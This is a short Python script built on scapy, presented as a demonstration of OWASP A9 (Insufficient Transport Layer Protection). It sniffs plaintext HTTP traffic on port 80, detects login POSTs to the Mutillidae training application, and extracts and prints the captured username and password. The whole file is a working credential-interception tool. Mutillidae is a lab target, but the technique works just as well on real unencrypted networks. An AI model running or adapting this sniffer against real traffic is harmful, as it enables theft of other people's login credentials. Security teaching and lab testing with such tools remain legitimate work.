#!/usr/bin/python

# www.r3oath.com

# Copyright (c) 2013 Tristan Strathearn

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.

import sys
import argparse
import re
from scapy.all import *

sysArgParser = argparse.ArgumentParser(description='')
sysArgParser.add_argument('--version', action='version', version='%(prog)s is at version 1.0.0')
sysArgs = sysArgParser.parse_args()

def CreateHLs(leng):
    print '-' * (leng + 4)

def PlusPrint(text):
    print '[+] ' + text

def main():
    PlusPrint('OWASP A9 Insufficient Transport Layer Protection.')
    PlusPrint('Author: Tristan Strathearn')
    PlusPrint('Website: www.r3oath.com')
    PlusPrint('Now scanning for login attempts...')
    sniff(filter='port 80', store=0, prn=processPacket)

def processPacket(packet):
    if Raw in packet:
        if packet[Raw].load.count('POST /mutillidae/index.php?page=login.php') >= 1:
            PlusPrint('Possible login attempt!...')
            reSearch = re.search(r'username=([a-zA-Z0-9-_]+)&password=([a-zA-Z0-9-_]+)', packet[Raw].load)
            if reSearch != None:
                username = reSearch.group(1)
                password = reSearch.group(2)
                PlusPrint('Captured Login!')
                msg = 'Username: %s -- Password: %s' % (username, password)
                CreateHLs(len(msg))
                PlusPrint(msg)
                CreateHLs(len(msg))
                sys.exit()
            else:
                PlusPrint('False Alarm, continuing.')

def exit():    
    pass

def interrupt():
    pass

def run(main, exit, interrupt):
    try:
        main()
    except KeyboardInterrupt:
        interrupt()
    finally:
        exit()

if __name__ == '__main__':
    run(main, exit, interrupt)